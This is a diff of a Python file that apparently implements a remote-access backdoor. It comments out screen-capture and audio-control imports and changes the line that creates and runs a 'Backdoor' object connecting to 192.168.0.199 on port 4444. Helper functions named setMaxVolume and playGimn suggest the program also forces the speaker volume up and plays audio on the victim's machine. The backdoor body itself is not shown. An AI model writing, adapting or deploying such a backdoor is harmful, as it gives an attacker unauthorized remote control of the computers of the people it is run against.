@@ -9,14 +9,15 @@ import time
 # os.system("pip3 install mss")
 # os.system("pip3 install numpy")
 # os.system("pip3 install opencv-python")
-import mss
-import cv2
+
+# import mss
+# import cv2
 import webbrowser
 
-from ctypes import cast, POINTER
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-from playsound import playsound
+# from ctypes import cast, POINTER
+# from comtypes import CLSCTX_ALL
+# from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+# from playsound import playsound
 
 
 def UkDecode(text):
@@ -153,9 +154,9 @@ class Backdoor:
 
 # time.sleep(10)
 
-devices = AudioUtilities.GetSpeakers()
-interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-volume = cast(interface, POINTER(IAudioEndpointVolume))
+# devices = AudioUtilities.GetSpeakers()
+# interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+# volume = cast(interface, POINTER(IAudioEndpointVolume))
 
 def setMaxVolume():
     while True:
@@ -178,5 +179,5 @@ def playGimn():
 # webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
 
 
-my_backdoor = Backdoor("192.168.0.108", 4444)
+my_backdoor = Backdoor("192.168.0.199", 4444)
 my_backdoor.run()
